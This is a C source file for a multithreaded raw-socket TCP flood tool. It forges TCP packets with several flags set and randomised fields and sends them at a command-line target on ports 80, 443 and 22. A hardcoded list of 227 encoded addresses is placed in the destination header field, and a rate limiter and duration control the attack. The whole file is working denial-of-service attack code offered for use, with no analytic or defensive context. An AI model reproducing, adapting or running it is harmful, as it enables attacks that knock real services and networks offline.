/*
 * This is released under the GNU GPL License v3.0, and is allowed to be used for commercial products ;)
 */
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;

void init_rand(unsigned long int x)
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}
unsigned long int rand_cmwc(void)
{
	unsigned long long int t, a = 18782LL;
	static unsigned long int i = 4095;
	unsigned long int x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c) {
		x++;
		c++;
	}
	return (Q[i] = r - x);
}
unsigned short csum (unsigned short *buf, int count)
{
	register unsigned long sum = 0;
	while( count > 1 ) { sum += *buf++; count -= 2; }
	if(count > 0) { sum += *(unsigned char *)buf; }
	while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
	return (unsigned short)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {

	struct tcp_pseudo
	{
		unsigned long src_addr;
		unsigned long dst_addr;
		unsigned char zero;
		unsigned char proto;
		unsigned short length;
	} pseudohead;
	unsigned short total_len = iph->tot_len;
	pseudohead.src_addr=iph->saddr;
	pseudohead.dst_addr=iph->daddr;
	pseudohead.zero=0;
	pseudohead.proto=IPPROTO_TCP;
	pseudohead.length=htons(sizeof(struct tcphdr));
	int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
	unsigned short *tcp = malloc(totaltcp_len);
	memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
	memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
	unsigned short output = csum(tcp,totaltcp_len);
	free(tcp);
	return output;
}
int randnum(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1;
    }
    else
    {
        low_num = max_num + 1;
        hi_num = min_num;
    }

    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}
void setup_ip_header(struct iphdr *iph)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
	iph->id = htonl(54321);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = 6;
	iph->check = 0;
	iph->saddr = inet_addr("192.168.3.100");
}
int ports[3] = {80, 443, 22};
void setup_tcp_header(struct tcphdr *tcph)
{
	tcph->source = rand();
  tcph->dest = htons(ports[randnum(0, 3)]);
	tcph->seq = rand();
	tcph->ack_seq = rand();
	tcph->res2 = 0;
	tcph->doff = 5;
 	tcph->syn = 1;
	tcph->psh = 1;
	tcph->ack = 1;
	tcph->urg = 1;
	tcph->window = rand();
	tcph->check = 0;
	//tcph->urg_ptr = rand();
}

void *flood(void *par1)
{
	char *td = (char *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
	
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(ports[randnum(0, 3)]);
	sin.sin_addr.s_addr = inet_addr(td);

	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if(s < 0){
		fprintf(stderr, "Could not open raw socket.\n");
		exit(-1);
	}
	memset(datagram, 0, MAX_PACKET_SIZE);
	setup_ip_header(iph);
	setup_tcp_header(tcph);

	tcph->dest = htons(ports[randnum(0, 3)]);
int class[227]= {764186402
,764186385
,764186533
,764186510
,764186539
,764186594
,764186535
,764186603
,764186508
,764186542
,764186397
,764186601
,764186395
,764186511
,764186420
,764186388
,764186536
,764186530
,764186504
,764186532
,764186605
,764186580
,764186439
,764186432
,764186584
,764186589
,764186583
,764186507
,764186525
,764186544
,764186526
,764186540
,764186419
,764186534
,764186527
,764186596
,764186591
,764186541
,764186538
,764186454
,764186599
,764186523
,764186528
,764186394
,764186396
,764186600
,764186524
,764186505
,764186592
,764186398
,764186386
,764186513
,764186587
,764186501
,764186381
,764186537
,764186543
,764186493
,764186595
,764186597
,764186588
,764186506
,764186598
,764186593
,764186529
,764186531
,764186590
,764186403
,764186481
,764186582
,764186500
,764186604
,764186586
,764186502
,764186585
,764186574
,764186602
,764186509
,764186381
,764186397
,764186533
,764186524
,764186500
,764186602
,764186612
,764186609
,764186532
,764186530
,764186541
,764186509
,764186510
,764186526
,764186593
,764186597
,764186621
,764186534
,764186584
,764186592
,764186527
,764186535
,764186582
,764186539
,764186585
,764186610
,764186618
,764186382
,764186544
,764186617
,764186603
,764186616
,764186540
,764186599
,764186605
,764186385
,764186543
,764186536
,764186439
,764186506
,764186505
,764186588
,764186587
,764186590
,764186604
,764186400
,764186598
,764186501
,764186614
,764186608
,764186420
,764186601
,764186507
,764186615
,764186542
,764186508
,764186388
,764186538
,764186619
,764186620
,764186595
,764186402
,764186504
,764186386
,764186611
,764186607
,764186606
,764186502
,764186525
,764186594
,764186600
,764186396
,764186523
,764186596
,764186583
,764186589
,764186613
,764186398
,764186528
,764186591
,764186531
,764186586
,764186537
,764186529
,764186527
,764186532
,764186582
,764186397
,764186606
,764186533
,764186541
,764186585
,764186420
,764186510
,764186590
,764186588
,764186595
,764186402
,764186501
,764186620
,764186504
,764186613
,764186608
,764186508
,764186386
,764186604
,764186381
,764186597
,764186621
,764186538
,764186509
,764186523
,764186607
,764186537
,764186526
,764186398
,764186396
,764186534
,764186619
,764186614
,764186589
,764186388
,764186593
,764186602
,764186592
,764186612
,764186591
,764186584
,764186596
,764186539
,764186605
,764186506
,764186536
,764186500
,764186603
,764186502
,764186615
,764186543
,764186587
,764186586
,764186505
,764186583
,764186610
,764186609
,764186616
,764186525
,764186598
,764186530
,764186617






















};

	iph->daddr = htonl(class[rand_cmwc()%227]);
	iph->check = csum ((unsigned short *) datagram, iph->tot_len);

	int tmp = 1;
	const int *val = &tmp;
	if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
		exit(-1);
	}

	init_rand(time(NULL));
	register unsigned int i;
	i = 0;
	while(1){
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));

		iph->saddr = sin.sin_addr.s_addr;
		iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
		iph->check = csum ((unsigned short *) datagram, iph->tot_len);
		tcph->seq = rand_cmwc() & 0xFFFF;
		tcph->source = htons(rand_cmwc() & 0xFFFF);
		tcph->check = 0;
		tcph->check = tcpcsum(iph, tcph);
		
		pps++;
		if(i >= limiter)
		{
			i = 0;
			usleep(sleeptime);
		}
		i++;
	}
}
int main(int argc, char *argv[ ])
{
	if(argc < 6){
		fprintf(stderr, "Invalid parameters!\n");
		fprintf(stdout, "Usage: %s <target IP> <port> <thread count> <pps limiter, -1 for no limit> <time>\n", argv[0]);
		exit(-1);
	}

	fprintf(stdout, "Setting up Sockets...\n");
  struct sockaddr_in sin;
  sin.sin_addr.s_addr = inet_addr(argv[1]);
	int num_threads = atoi(argv[3]);
	floodport = atoi(argv[2]);
	int maxpps = atoi(argv[4]);
	limiter = 0;
	pps = 0;
	pthread_t thread[num_threads];
	
	int multiplier = 20;

	int i;
	for(i = 0;i<num_threads;i++){
		pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
	}
	fprintf(stdout, "Starting Flood...\n");
	for(i = 0;i<(atoi(argv[5])*multiplier);i++)
	{
		usleep((1000/multiplier)*1000);
		if((pps*multiplier) > maxpps)
		{
			if(1 > limiter)
			{
				sleeptime+=100;
			} else {
				limiter--;
			}
		} else {
			limiter++;
			if(sleeptime > 25)
			{
				sleeptime-=25;
			} else {
				sleeptime = 0;
			}
		}
		pps = 0;
	}

	return 0;
}